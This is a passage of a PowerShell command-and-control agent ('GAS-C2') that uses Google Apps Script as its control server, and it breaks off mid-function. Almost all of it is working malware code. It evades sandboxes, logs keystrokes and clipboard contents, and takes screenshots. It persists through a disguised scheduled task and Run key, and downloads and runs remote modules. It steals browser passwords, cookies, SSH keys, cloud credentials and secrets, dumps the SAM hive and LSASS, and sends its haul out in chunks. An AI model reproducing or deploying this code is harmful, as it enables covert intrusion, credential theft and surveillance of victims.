<#
.SYNOPSIS
    GAS-C2 PowerShell Agent -- Full C2 Framework
    Security Research 
.DESCRIPTION
    Bidirectional C2 agent using Google Apps Script + Sheets as infrastructure.
    Features: persistent runspace, background jobs, keylogger, dynamic reconfig,
    chunked file transfer, remote module loading.
.EXAMPLE
    powershell -ep bypass -File agent.ps1
    powershell -ep bypass -w hidden -NonInteractive -File agent.ps1
#>

param(
    [string]$C2Url       = "YOUR_GAS_WEBAPP_URL_HERE",
    [int]$PollInterval   = 8,
    [string]$Token       = "gas-c2-vrp-2026",
    [string]$XorKey      = "GAS_VRP_2026_K"
)

# ─── SCRIPT-SCOPED CONFIG (mutable for remote reconfiguration) ────────────────

[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12

$script:id        = [Guid]::NewGuid().ToString()
$script:c2Url     = $C2Url
$script:xorKey    = $XorKey
$script:token     = $Token
$script:pollInt   = $PollInterval
$script:jitter    = 4
$script:running   = $true
$script:startTime = Get-Date
$script:ua        = 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.36'

# Background job tracking
$script:bgJobs    = @{}
$script:bgCounter = 0

# Keylogger state
$script:klJob       = $null
$script:klFile      = "$env:TEMP\." + [guid]::NewGuid().ToString('N').Substring(0,14)
$script:klLastExfil = [datetime]::MinValue

# Clipboard watcher state
$script:clipJob  = $null
$script:clipFile = "$env:TEMP\." + [guid]::NewGuid().ToString('N').Substring(0,14) + 'c'

# Module tracking
$script:loadedModules = @()

# ─── XOR CRYPTO ───────────────────────────────────────────────────────────────

function xorEncode([string]$text, [string]$key) {
    $tb  = [Text.Encoding]::UTF8.GetBytes($text)
    $kb  = [Text.Encoding]::UTF8.GetBytes($key)
    $out = [byte[]]::new($tb.Length)
    for ($i = 0; $i -lt $tb.Length; $i++) { $out[$i] = $tb[$i] -bxor $kb[$i % $kb.Length] }
    return [Convert]::ToBase64String($out)
}

function xorDecode([string]$b64, [string]$key) {
    try {
        $bytes = [Convert]::FromBase64String($b64)
        $kb    = [Text.Encoding]::UTF8.GetBytes($key)
        $out   = [byte[]]::new($bytes.Length)
        for ($i = 0; $i -lt $bytes.Length; $i++) { $out[$i] = $bytes[$i] -bxor $kb[$i % $kb.Length] }
        return [Text.Encoding]::UTF8.GetString($out)
    } catch { return $b64 }
}

# ─── ANTI-SANDBOX ─────────────────────────────────────────────────────────────

function isSandbox {
    $procs = (Get-Process -EA SilentlyContinue).Count
    if ($procs -lt 28) { return $true }

    $badHosts = 'sandbox','malware','virus','sample','cuckoo','anyrun','hybrid','analysis','vmware'
    foreach ($bad in $badHosts) { if ($env:COMPUTERNAME -imatch $bad) { return $true } }

    try {
        $uptime = ((Get-Date) - (Get-CimInstance Win32_OperatingSystem -EA Stop).LastBootUpTime).TotalMinutes
        if ($uptime -lt 4) { return $true }
    } catch {}

    $badUsers = 'sandbox','malware','virus','sample','cuckoo','john','tester','vmuser'
    if ($env:USERNAME -in $badUsers) { return $true }

    return $false
}

# ─── HTTP ─────────────────────────────────────────────────────────────────────

function xGet([string]$url) {
    try {
        $c = New-Object Net.WebClient
        $c.Headers.Add('User-Agent',      $script:ua)
        $c.Headers.Add('Accept',          'application/json, text/plain, */*')
        $c.Headers.Add('Accept-Language', 'en-US,en;q=0.9')
        $c.Headers.Add('Referer',         'https://docs.google.com/')
        return $c.DownloadString($url) | ConvertFrom-Json
    } catch { return $null }
}

function xPost([string]$url, $body) {
    try {
        $bytes = [Text.Encoding]::UTF8.GetBytes(($body | ConvertTo-Json -Depth 10 -Compress))
        $c = New-Object Net.WebClient
        $c.Headers.Add('User-Agent',   $script:ua)
        $c.Headers.Add('Content-Type', 'application/json')
        $c.Headers.Add('Referer',      'https://docs.google.com/')
        $c.Headers.Add('Origin',       'https://docs.google.com')
        $c.UploadData($url, 'POST', $bytes) | Out-Null
    } catch {}
}

# ─── METADATA ─────────────────────────────────────────────────────────────────

function getMeta {
    return @{
        id    = $script:id
        host  = $env:COMPUTERNAME
        user  = "$env:USERDOMAIN\$env:USERNAME"
        os    = (Get-CimInstance Win32_OperatingSystem -EA SilentlyContinue).Caption
        arch  = $env:PROCESSOR_ARCHITECTURE
        ps    = $PSVersionTable.PSVersion.ToString()
        ip    = (Get-NetIPAddress -AddressFamily IPv4 -EA SilentlyContinue | Where-Object { $_.IPAddress -notlike '127.*' } | Select-Object -First 1 -ExpandProperty IPAddress)
        admin = ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)
        av    = (Get-CimInstance -Namespace root/SecurityCenter2 -ClassName AntiVirusProduct -EA SilentlyContinue | Select-Object -ExpandProperty displayName) -join ', '
        ts    = (Get-Date -Format o)
    }
}

# ─── PERSISTENT RUNSPACE -- stateful shell session ─────────────────────────────

$script:rs = [runspacefactory]::CreateRunspace()
$script:rs.ApartmentState = 'STA'
$script:rs.ThreadOptions  = 'ReuseThread'
$script:rs.Open()

function rsExec([string]$code) {
    $ps = [powershell]::Create()
    $ps.Runspace = $script:rs
    [void]$ps.AddScript($code)
    $output = $ps.Invoke()
    $errs   = $ps.Streams.Error | ForEach-Object { "[ERR] $_" }
    $ps.Dispose()
    $all = @($output | ForEach-Object { "$_" }) + @($errs)
    return ($all -join "`n").TrimEnd()
}

function rsGet([string]$code) {
    # Returns raw object from runspace (for internal use)
    $ps = [powershell]::Create()
    $ps.Runspace = $script:rs
    [void]$ps.AddScript($code)
    $result = $ps.Invoke()
    $ps.Dispose()
    return $result
}

# ─── BACKGROUND JOBS ──────────────────────────────────────────────────────────

function bgStart([string]$cmd) {
    $jid  = 'J' + (++$script:bgCounter)
    $bgRs = [runspacefactory]::CreateRunspace()
    $bgRs.Open()
    $bgPs = [powershell]::Create()
    $bgPs.Runspace = $bgRs
    [void]$bgPs.AddScript($cmd)
    $script:bgJobs[$jid] = @{
        ps      = $bgPs
        rs      = $bgRs
        cmd     = $cmd
        started = Get-Date
        handle  = $bgPs.BeginInvoke()
    }
    return "Background job $jid started -- poll with: jobs / job $jid"
}

function bgList {
    if ($script:bgJobs.Count -eq 0) { return "[no background jobs]" }
    $rows = foreach ($kv in $script:bgJobs.GetEnumerator()) {
        $done    = $kv.Value.handle.IsCompleted
        $elapsed = [math]::Round(((Get-Date) - $kv.Value.started).TotalSeconds, 1)
        "$($kv.Key) | $(if ($done) {'DONE'} else {'RUNNING'}) | ${elapsed}s | $($kv.Value.cmd)"
    }
    return $rows -join "`n"
}

function bgGetResult([string]$jid) {
    if (!$script:bgJobs.ContainsKey($jid)) { return "[job not found: $jid]" }
    $j = $script:bgJobs[$jid]
    if (!$j.handle.IsCompleted) { return "[job $jid still running -- try later]" }
    $out = $j.ps.EndInvoke($j.handle) | ForEach-Object { "$_" }
    $err = $j.ps.Streams.Error | ForEach-Object { "[ERR] $_" }
    $j.ps.Dispose(); $j.rs.Dispose()
    $script:bgJobs.Remove($jid)
    return ((@($out) + @($err)) -join "`n").TrimEnd()
}

function bgAutoPost {
    # Called from main loop -- auto-posts completed bg jobs to C2
    foreach ($kv in @($script:bgJobs.GetEnumerator())) {
        if ($kv.Value.handle.IsCompleted) {
            $jid = $kv.Key
            $j   = $kv.Value
            $out = $j.ps.EndInvoke($j.handle) | ForEach-Object { "$_" }
            $err = $j.ps.Streams.Error | ForEach-Object { "[ERR] $_" }
            $j.ps.Dispose(); $j.rs.Dispose()
            $script:bgJobs.Remove($jid)
            $result = ((@($out) + @($err)) -join "`n").TrimEnd()
            if (!$result) { $result = "[no output]" }
            $enc = xorEncode $result $script:xorKey
            xPost $script:c2Url @{ agent_id=$script:id; cmd_id="bg-$jid"; output=$enc; error=$false; metadata=(getMeta) }
        }
    }
}

# ─── KEYLOGGER ────────────────────────────────────────────────────────────────

# C# type definition for keylogger (passed as argument to Start-Job to avoid nested here-string)
$script:klCsCode = @"
using System;
using System.IO;
using System.Runtime.InteropServices;
using System.Text;
public static class KL {
    [DllImport("user32.dll")] public static extern short GetAsyncKeyState(int v);
    [DllImport("user32.dll")] public static extern IntPtr GetForegroundWindow();
    [DllImport("user32.dll")] public static extern int GetWindowText(IntPtr h, StringBuilder s, int n);
}
"@

function klStart {
    if ($script:klJob -and $script:klJob.State -eq 'Running') { return "[keylogger already running]" }
    $logFile = $script:klFile
    $csCode  = $script:klCsCode

    $script:klJob = Start-Job -ScriptBlock {
        param($f, $cs)
        Add-Type -TypeDefinition $cs -EA SilentlyContinue
        $pw = [bool[]]::new(256); $lw = ''
        # Open with FileShare.ReadWrite so klDump can read while the job is writing
        $fs = New-Object IO.FileStream($f, [IO.FileMode]::Append, [IO.FileAccess]::Write, [IO.FileShare]::ReadWrite)
        $sw = New-Object IO.StreamWriter($fs, [Text.Encoding]::UTF8)
        $sw.AutoFlush = $true
        while ($true) {
            try {
                $s2 = [Text.StringBuilder]::new(256)
                [KL]::GetWindowText([KL]::GetForegroundWindow(), $s2, 256) | Out-Null
                $w  = $s2.ToString()
                if ($w -and $w -ne $lw) {
                    $sw.WriteLine("`n[$(Get-Date -Format HH:mm:ss)] [$w]"); $lw = $w
                }
                for ($v = 8; $v -le 222; $v++) {
                    $d = ([KL]::GetAsyncKeyState($v) -band 0x8000) -ne 0
                    if ($d -and !$pw[$v]) {
                        switch ($v) {
                            8   { $sw.Write('[BS]')  } 9  { $sw.Write('[TAB]') }
                            13  { $sw.Write("`n")    } 27 { $sw.Write('[ESC]') }
                            32  { $sw.Write(' ')     }
                            { $_ -ge 65 -and $_ -le 90 } {
                                $sh = (([KL]::GetAsyncKeyState(160) -bor [KL]::GetAsyncKeyState(161)) -band 0x8000) -ne 0
                                $cp = ([KL]::GetAsyncKeyState(20) -band 1) -ne 0
                                $sw.Write([char](if ($sh -xor $cp) { $v } else { $v + 32 }))
                            }
                            { $_ -ge 48 -and $_ -le 57 } { $sw.Write([char]$v) }
                            190 { $sw.Write('.') } 186 { $sw.Write(';') } 188 { $sw.Write(',') }
                            222 { $sw.Write("'") } 189 { $sw.Write('-') } 187 { $sw.Write('=') }
                            191 { $sw.Write('/') }
                        }
                    }
                    $pw[$v] = $d
                }
            } catch {}
            [System.Threading.Thread]::Sleep(15)
        }
    } -ArgumentList $logFile, $csCode

    $script:klLastExfil = Get-Date
    return "[keylogger started | auto-exfil every 60s if buffer >= 100 chars]"
}

function klStop {
    if (!$script:klJob) { return "[keylogger not running]" }
    Stop-Job  $script:klJob -EA SilentlyContinue
    Remove-Job $script:klJob -Force -EA SilentlyContinue
    $script:klJob = $null
    return "[keylogger stopped]"
}

function klReadAndClear {
    # Reads keylog file with FileShare.ReadWrite (works while job is writing), then truncates to 0
    $fs = $null; $sr = $null
    try {
        $fs = New-Object IO.FileStream($script:klFile, [IO.FileMode]::Open, [IO.FileAccess]::ReadWrite, [IO.FileShare]::ReadWrite)
        $sr = New-Object IO.StreamReader($fs, [Text.Encoding]::UTF8)
        $d  = $sr.ReadToEnd()
        $fs.SetLength(0)   # truncate in-place — safe while job appends
        return $d
    } catch { return $null }
    finally { if ($sr) { $sr.Close() }; if ($fs) { $fs.Close() } }
}

function klDump {
    if (!(Test-Path $script:klFile -EA SilentlyContinue)) { return "[no keylog data]" }
    $d = klReadAndClear
    if ($d -and $d.Trim()) { return $d } else { return "[empty buffer]" }
}

function klAutoExfil {
    if (!($script:klJob -and $script:klJob.State -eq 'Running')) { return }
    if (((Get-Date) - $script:klLastExfil).TotalSeconds -lt 60) { return }
    $script:klLastExfil = Get-Date
    if (!(Test-Path $script:klFile -EA SilentlyContinue)) { return }
    $d = klReadAndClear
    if (!$d -or $d.Length -lt 100) { return }
    $enc = xorEncode $d $script:xorKey
    xPost $script:c2Url @{ agent_id=$script:id; cmd_id="keylog-auto-$(Get-Date -Format yyyyMMddHHmmss)"; output=$enc; error=$false; metadata=@{} }
}

# ─── CLIPBOARD WATCHER ────────────────────────────────────────────────────────

function clipStart {
    if ($script:clipJob -and $script:clipJob.State -eq 'Running') { return "[clipboard watcher already running]" }
    $f = $script:clipFile
    $script:clipJob = Start-Job -ScriptBlock {
        param($f)
        $last = ''
        while ($true) {
            try {
                # Get-Clipboard works in MTA jobs (no STA requirement unlike WPF Clipboard)
                $c = Get-Clipboard -Raw -EA SilentlyContinue
                if ($c -and $c -ne $last) {
                    $ts = Get-Date -Format "yyyy-MM-dd HH:mm:ss"
                    Add-Content $f -Value "[$ts]`n$c`n---`n" -Encoding UTF8
                    $last = $c
                }
            } catch {}
            Start-Sleep -Seconds 2
        }
    } -ArgumentList $f
    return "[clipboard watcher started]"
}

function clipStop {
    if ($script:clipJob) {
        Stop-Job $script:clipJob -EA SilentlyContinue
        Remove-Job $script:clipJob -Force -EA SilentlyContinue
        $script:clipJob = $null
    }
    return "[clipboard watcher stopped]"
}

function clipDump {
    if (!(Test-Path $script:clipFile -EA SilentlyContinue)) { return "[no clipboard data]" }
    $d = Get-Content $script:clipFile -Raw -EA SilentlyContinue
    Remove-Item $script:clipFile -Force -EA SilentlyContinue
    if ($d) { return $d } else { return "[empty]" }
}

# ─── CHUNKED FILE UPLOAD ──────────────────────────────────────────────────────

function uploadChunked([string]$path) {
    $fname = [IO.Path]::GetFileName($path)
    $bytes = [IO.File]::ReadAllBytes($path)
    $b64   = [Convert]::ToBase64String($bytes)

    $CHUNK = 6500
    $total = [Math]::Ceiling($b64.Length / $CHUNK)

    if ($total -le 1) {
        return "FILE_B64:$fname`:$b64"
    }

    $xid = [guid]::NewGuid().ToString('N').Substring(0, 8)
    for ($i = 0; $i -lt $total; $i++) {
        $data  = $b64.Substring($i * $CHUNK, [Math]::Min($CHUNK, $b64.Length - $i * $CHUNK))
        $plain = "CHUNK:$xid`:$i/$total`:$fname`:$data"
        $enc   = xorEncode $plain $script:xorKey
        xPost $script:c2Url @{
            agent_id = $script:id
            cmd_id   = "XFER-$xid-$i-of-$total"
            output   = $enc
            error    = $false
            metadata = @{ xfer_id=$xid; chunk=$i; total=$total; file=$fname }
        }
        Start-Sleep -Milliseconds 300
    }
    return "Upload queued: $fname | $total chunks | $($bytes.Length) bytes | xfer_id=$xid"
}

# ─── DYNAMIC MODULE LOADER ────────────────────────────────────────────────────

function loadModule([string]$url) {
    try {
        $code = (New-Object Net.WebClient).DownloadString($url)
        $out  = rsExec $code
        $name = Split-Path $url -Leaf
        $script:loadedModules += $name
        return "[module loaded: $name]`n$out"
    } catch { return "[load error] $_" }
}

# ─── SCREENSHOT ───────────────────────────────────────────────────────────────

function doScreenshot {
    try {
        Add-Type -AssemblyName 'System.Windows.Forms'
        Add-Type -AssemblyName 'System.Drawing'
        $s  = [System.Windows.Forms.Screen]::PrimaryScreen.Bounds
        $bm = New-Object System.Drawing.Bitmap($s.Width, $s.Height)
        $g  = [System.Drawing.Graphics]::FromImage($bm)
        $g.CopyFromScreen(0, 0, 0, 0, $bm.Size)
        $ms = New-Object System.IO.MemoryStream
        $bm.Save($ms, [System.Drawing.Imaging.ImageFormat]::Png)
        $g.Dispose(); $bm.Dispose()
        return 'SCREENSHOT_B64:' + [Convert]::ToBase64String($ms.ToArray())
    } catch { return "[screenshot error] $_" }
}

# ─── PERSISTENCE ──────────────────────────────────────────────────────────────

function doPersist {
    $dir  = "$env:APPDATA\Microsoft\Windows\WinUpdate"
    $file = "$dir\WinUpdateSvc.ps1"
    New-Item -ItemType Directory -Force -Path $dir | Out-Null
    Copy-Item $MyInvocation.ScriptName $file -Force

    $arg = "-ep bypass -w hidden -NonInteractive -File `"$file`" -C2Url `"$script:c2Url`" -PollInterval $script:pollInt -Token `"$script:token`" -XorKey `"$script:xorKey`""
    $act = New-ScheduledTaskAction -Execute 'powershell.exe' -Argument $arg
    $trg = New-ScheduledTaskTrigger -AtLogOn
    $set = New-ScheduledTaskSettingsSet -Hidden -RestartInterval (New-TimeSpan -Minutes 2) -RestartCount 9 -ExecutionTimeLimit (New-TimeSpan -Hours 0)
    $pri = New-ScheduledTaskPrincipal -UserId $env:USERNAME -RunLevel Limited
    Register-ScheduledTask -TaskName 'WinUpdateSvc' -Action $act -Trigger $trg -Settings $set -Principal $pri -Force | Out-Null

    Set-ItemProperty -Path 'HKCU:\Software\Microsoft\Windows\CurrentVersion\Run' `
        -Name 'WindowsUpdateService' -Value "powershell $arg" -EA SilentlyContinue

    return "Persist OK: Task 'WinUpdateSvc' + HKCU Run key -> $file"
}

function doUnpersist {
    Unregister-ScheduledTask -TaskName 'WinUpdateSvc' -Confirm:$false -EA SilentlyContinue
    Remove-Item "$env:APPDATA\Microsoft\Windows\WinUpdate" -Recurse -Force -EA SilentlyContinue
    Remove-ItemProperty -Path 'HKCU:\Software\Microsoft\Windows\CurrentVersion\Run' -Name 'WindowsUpdateService' -EA SilentlyContinue
    return 'Persistence removed'
}

# ─── CREDENTIAL EXFILTRATION ──────────────────────────────────────────────────

function getBrowserCreds {
    $results = @()
    $browsers = [ordered]@{
        'Chrome' = "$env:LOCALAPPDATA\Google\Chrome\User Data"
        'Edge'   = "$env:LOCALAPPDATA\Microsoft\Edge\User Data"
        'Brave'  = "$env:LOCALAPPDATA\BraveSoftware\Brave-Browser\User Data"
    }
    foreach ($bName in $browsers.Keys) {
        $bPath = $browsers[$bName]
        if (!(Test-Path $bPath)) { continue }
        $profiles = @('Default') + (Get-ChildItem $bPath -Directory -EA SilentlyContinue |
                       Where-Object { $_.Name -match '^Profile \d+$' } |
                       Select-Object -ExpandProperty Name)
        foreach ($profile in $profiles) {
            $db = "$bPath\$profile\Login Data"
            if (Test-Path $db) {
                $tmp = "$env:TEMP\." + [guid]::NewGuid().ToString('N').Substring(0,8)
                Copy-Item $db $tmp -Force -EA SilentlyContinue
                if (Test-Path $tmp) {
                    $b64 = [Convert]::ToBase64String([IO.File]::ReadAllBytes($tmp))
                    $results += "BROWSER_LOGINDB:${bName}:${profile}:$b64"
                    Remove-Item $tmp -Force -EA SilentlyContinue
                }
            }
        }
        # Local State contains the DPAPI-encrypted AES-256 key for password decryption
        $ls = "$bPath\Local State"
        if (Test-Path $ls) {
            $lsb64 = [Convert]::ToBase64String([IO.File]::ReadAllBytes($ls))
            $results += "BROWSER_LOCALSTATE:${bName}:$lsb64"
        }
    }
    if (!$results) { return "[no browser credential databases found]" }
    return ($results -join "`n") + "`n// Decrypt offline: python3 decrypt_chrome_passwords.py <LoginData> <LocalState>"
}

function getBrowserCookies {
    $results = @()
    $browsers = [ordered]@{
        'Chrome' = "$env:LOCALAPPDATA\Google\Chrome\User Data"
        'Edge'   = "$env:LOCALAPPDATA\Microsoft\Edge\User Data"
        'Brave'  = "$env:LOCALAPPDATA\BraveSoftware\Brave-Browser\User Data"
    }
    foreach ($bName in $browsers.Keys) {
        $bPath = $browsers[$bName]
        if (!(Test-Path $bPath)) { continue }
        $profiles = @('Default') + (Get-ChildItem $bPath -Directory -EA SilentlyContinue |
                       Where-Object { $_.Name -match '^Profile \d+$' } |
                       Select-Object -ExpandProperty Name)
        foreach ($profile in $profiles) {
            # Chrome 96+ stores cookies under Network\Cookies
            $db = "$bPath\$profile\Network\Cookies"
            if (!(Test-Path $db)) { $db = "$bPath\$profile\Cookies" }
            if (Test-Path $db) {
                $tmp = "$env:TEMP\." + [guid]::NewGuid().ToString('N').Substring(0,8)
                Copy-Item $db $tmp -Force -EA SilentlyContinue
                if (Test-Path $tmp) {
                    $b64 = [Convert]::ToBase64String([IO.File]::ReadAllBytes($tmp))
                    $results += "BROWSER_COOKIEDB:${bName}:${profile}:$b64"
                    Remove-Item $tmp -Force -EA SilentlyContinue
                }
            }
        }
    }
    if (!$results) { return "[no browser cookie databases found]" }
    return ($results -join "`n") + "`n// Decrypt offline: python3 decrypt_chrome_cookies.py <Cookies> <LocalState>"
}

function getSSHKeys {
    $results = @()
    $keyPatterns = @('id_rsa','id_ed25519','id_ecdsa','id_dsa','*.pem','*.ppk')
    foreach ($loc in @("$env:USERPROFILE\.ssh", "C:\Users\*\.ssh")) {
        foreach ($pat in $keyPatterns) {
            Get-ChildItem -Path $loc -Filter $pat -Recurse -Force -EA SilentlyContinue |
                Where-Object { !$_.PSIsContainer } | ForEach-Object {
                    $c = Get-Content $_.FullName -Raw -EA SilentlyContinue
                    if ($c -match '(PRIVATE KEY|RSA PRIVATE|EC PRIVATE|BEGIN)') {
                        $results += "SSH_KEY:$($_.FullName)`n$c"
                    }
                }
        }
    }
    # Catch stray .key files in user profile
    Get-ChildItem "$env:USERPROFILE" -Filter '*.key' -Recurse -Force -EA SilentlyContinue |
        Where-Object { !$_.PSIsContainer -and $_.Length -lt 10KB } | ForEach-Object {
            $c = Get-Content $_.FullName -Raw -EA SilentlyContinue
            if ($c -match 'PRIVATE KEY') { $results += "SSH_KEY:$($_.FullName)`n$c" }
        }
    return if ($results) { $results -join "`n---`n" } else { "[no SSH private keys found]" }
}

function getCloudKeys {
    $findings = @()
    # AWS credentials
    foreach ($f in @("$env:USERPROFILE\.aws\credentials", "$env:USERPROFILE\.aws\config")) {
        if (Test-Path $f) { $findings += "AWS:$f`n" + (Get-Content $f -Raw -EA SilentlyContinue) }
    }
    # Azure credentials
    if (Test-Path "$env:USERPROFILE\.azure") {
        Get-ChildItem "$env:USERPROFILE\.azure" -File -Recurse -EA SilentlyContinue | ForEach-Object {
            $c = Get-Content $_.FullName -Raw -EA SilentlyContinue
            if ($c) { $findings += "AZURE:$($_.FullName)`n$c" }
        }
    }
    # GCP credentials
    foreach ($d in @("$env:APPDATA\gcloud", "$env:USERPROFILE\.config\gcloud")) {
        if (Test-Path $d) {
            Get-ChildItem $d -File -Recurse -EA SilentlyContinue |
                Where-Object { $_.Name -match '(cred|token|json|key)' } | ForEach-Object {
                    $c = Get-Content $_.FullName -Raw -EA SilentlyContinue
                    if ($c) { $findings += "GCP:$($_.FullName)`n$c" }
                }
        }
    }
    # Docker / Kubernetes configs
    foreach ($f in @("$env:USERPROFILE\.docker\config.json", "$env:USERPROFILE\.kube\config")) {
        if (Test-Path $f) { $findings += "CONTAINER:$f`n" + (Get-Content $f -Raw -EA SilentlyContinue) }
    }
    # Environment variable secrets
    $envSec = Get-ChildItem Env: | Where-Object {
        $_.Name  -imatch '(key|secret|token|pass|cred|api|auth)' -or
        $_.Value -imatch '(AKIA[0-9A-Z]{16}|sk-[a-zA-Z0-9]{20,}|ghp_|glpat-)'
    }
    if ($envSec) { $findings += "ENV_SECRETS:`n" + ($envSec | Format-Table Name, Value -Auto | Out-String) }
    return if ($findings) { $findings -join "`n---`n" } else { "[no cloud credentials found]" }
}

function doSAMDump {
    $isAdmin = ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)
    if (!$isAdmin) { return "[sam-dump requires Administrator privileges]" }
    $s = "$env:TEMP\." + [guid]::NewGuid().ToString('N').Substring(0,8) + '_sam'
    $y = "$env:TEMP\." + [guid]::NewGuid().ToString('N').Substring(0,8) + '_sys'
    try {
        reg save "HKLM\SAM"    $s /y 2>&1 | Out-Null
        reg save "HKLM\SYSTEM" $y /y 2>&1 | Out-Null
        $out  = "SAM hive:    $s`nSYSTEM hive: $y`n"
        $out += "Extract hashes: impacket-secretsdump -sam sam.hive -system system.hive LOCAL`n---`n"
        if (Test-Path $s) { $out += uploadChunked $s;  Remove-Item $s  -Force -EA SilentlyContinue }
        if (Test-Path $y) { $out += "`n" + (uploadChunked $y); Remove-Item $y -Force -EA SilentlyContinue }
        return $out
    } catch { return "[sam-dump error] $_" }
}

function doLSASSDump {
    $isAdmin = ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)
    if (!$isAdmin) { return "[lsass-dump requires Administrator privileges]" }
    $dump = "$env:TEMP\." + [guid]::NewGuid().ToString('N').Substring(0,8) + '.dmp'
    try {
        $pid_ = (Get-Process lsass -EA Stop).Id
        # comsvcs.dll MiniDump — built-in Windows technique, no extra tools needed
        & "$env:SystemRoot\System32\rundll32.exe" "$env:SystemRoot\System32\comsvcs.dll" "MiniDump $pid_ $dump full" 2>&1 | Out-Null
        Start-Sleep -Seconds 3   # wait for dump to complete
        if (!(Test-Path $dump)) { return "[lsass-dump: file not created — may need SeDebugPrivilege or PPL bypass]" }
        $sz  = (Get-Item $dump).Length
        $out = "LSASS dump: $dump ($sz bytes)`n"
        $out += "Parse: pypykatz lsa minidump lsass.dmp  OR  mimikatz sekurlsa::minidump lsass.dmp + sekurlsa::logonpasswords`n---`n"
        $out += uploadChunked $dump
        Remove-Item $dump -Force -EA SilentlyContinue
        return $out
    } catch { return "[lsass-dump error] $_" }
}

# ─── DOCUMENT & CODE DISCOVERY ────────────────────────────────────────────────

function findDocs([string]$ext = '', [string]$searchPath = $env:USERPROFILE) {
    $exts  = if ($ext) { @("*.$ext") } else { @('*.pdf','*.docx','*.xlsx','*.pptx','*.doc','*.xls','*.csv') }
    $found = @()
    foreach ($e in $exts) {
        Get-ChildItem $searchPath -Filter $e -Recurse -Force -EA SilentlyContinue |
            Where-Object { !$_.PSIsContainer } | ForEach-Object {
                $found += "$($_.LastWriteTime.ToString('yyyy-MM-dd')) | $([math]::Round($_.Length/1KB,1))KB | $($_.FullName)"
            }
    }
    return if ($found) { "Found $($found.Count) document(s):`n" + ($found -join "`n") } else { "[no documents found in $searchPath]" }
}

function findCode([string]$searchPath = $env:USERPROFILE) {
    $codeExts = @('*.cs','*.py','*.js','*.ts','*.ps1','*.php','*.rb','*.go','*.java','*.cpp','*.c','*.sh','*.env','*.yaml','*.yml','*.config','*.toml')
    $found = @()
    Get-ChildItem $searchPath -Filter '.git' -Directory -Recurse -Force -EA SilentlyContinue |
        ForEach-Object { $found += "[GIT REPO] $($_.Parent.FullName)" }
    foreach ($e in $codeExts) {
        Get-ChildItem $searchPath -Filter $e -Recurse -Force -EA SilentlyContinue |
            Where-Object { !$_.PSIsContainer } | ForEach-Object {
                $found += "$($_.LastWriteTime.ToString('yyyy-MM-dd')) | $([math]::Round($_.Length/1KB,1))KB | $($_.FullName)"
            }
    }
    return if ($found) { "Found $($found.Count) code files/repos:`n" + ($found -join "`n") } else { "[no code found in $searchPath]" }
}

function findSecrets([string]$searchPath = $env:USERPROFILE) {
    $pats = @(
        'password\s*[=:]\s*[^\s]{4,}',
        'secret\s*[=:]\s*[^\s]{4,}',
        'api[_\-]?key\s*[=:]\s*[^\s]{4,}',
        'access[_\-]?token\s*[=:]\s*[^\s]{4,}',
        'AKIA[0-9A-Z]{16}',
        'sk-[a-zA-Z0-9]{20,}',
        'ghp_[a-zA-Z0-9]{36}',
        'glpat-[a-zA-Z0-9_\-]{20,}',
        'mongodb\+srv://',
        '[a-zA-Z]+://[^/\s]+:[^@/\s]{4,}@'
    )
    $targetExts = @('*.env','*.config','*.json','*.yaml','*.yml','*.xml','*.ini','*.conf','*.cfg','*.properties','*.ps1','*.py','*.js','*.php','*.rb','*.sh')
    $hits = @()
    foreach ($ext in $targetExts) {
        Get-ChildItem $searchPath -Filter $ext -Recurse -Force -EA SilentlyContinue |
            Where-Object { !$_.PSIsContainer -and $_.Length -lt 512KB } | ForEach-Object {
                try {
                    $content = [IO.File]::ReadAllText($_.FullName)
                    foreach ($p in $pats) {
                        $ms = [regex]::Matches($content, $p, [Text.RegularExpressions.RegexOptions]::IgnoreCase)
                        foreach ($x in $ms) {
                            $val = $x.Value.Trim()
                            $hits += "$($_.FullName) -> $($val.Substring(0, [Math]::Min(120, $val.Length)))"
                        }
                    }
                } catch {}
            }
    }
    return if ($hits) { "Secrets found ($($hits.Count) matches):`n" + ($hits -join "`n") } else { "[no secrets found in $searchPath]" }
}

# ─── NETWORK RECON ────────────────────────────────────────────────────────────

function getDNSCache   { return (ipconfig /displaydns 2>&1) | Out-String }

function getShares {
    $net = (net share 2>&1) | Out-String
    $smb = Get-SmbShare -EA SilentlyContinue | Format-Table Name, Path, Description -Auto | Out-String
    return "=== Net Share ===`n$net`n=== SMB Shares ===`n$smb"
}

function getDomainInfo {
    try {
        $d = [DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()
        return @{
            domain      = $d.Name
            pdc         = $d.PdcRoleOwner.Name
            forest      = $d.Forest.Name
            level       = $d.DomainModeLevel.ToString()
            controllers = ($d.DomainControllers | Select-Object -ExpandProperty Name) -join ', '
        } | ConvertTo-Json
    } catch { return "[not domain-joined or LDAP unavailable] $_" }
}

function getLDAPUsers {
    try {
        $s = New-Object DirectoryServices.DirectorySearcher
        $s.Filter   = "(&(objectClass=user)(objectCategory=person))"
        $s.PageSize = 1000
        $s.PropertiesToLoad.AddRange([string[]]@('samAccountName','displayName','mail','userAccountControl'))
        $rows = $s.FindAll() | ForEach-Object {
            $uac = $_.Properties['userAccountControl']
            $st  = if ($uac -and ($uac[0] -band 2)) { 'DISABLED' } else { 'ENABLED' }
            "$($_.Properties['samaccountname']) | $($_.Properties['displayname']) | $($_.Properties['mail']) | $st"
        }
        return "AD Users ($($rows.Count)):`n" + ($rows -join "`n")
    } catch { return "[ldap-users: not domain-joined or access denied] $_" }
}

function getLDAPGroups {
    try {
        $s = New-Object DirectoryServices.DirectorySearcher
        $s.Filter   = "(objectClass=group)"
        $s.PageSize = 500
        $s.PropertiesToLoad.AddRange([string[]]@('cn','description','member'))
        $rows = $s.FindAll() | ForEach-Object {
            $mc = if ($_.Properties['member']) { $_.Properties['member'].Count } else { 0 }
            "$($_.Properties['cn']) | $mc members | $($_.Properties['description'])"
        }
        return "AD Groups ($($rows.Count)):`n" + ($rows -join "`n")
    } catch { return "[ldap-groups: not domain-joined or access denied] $_" }
}

function getRDPSessions {
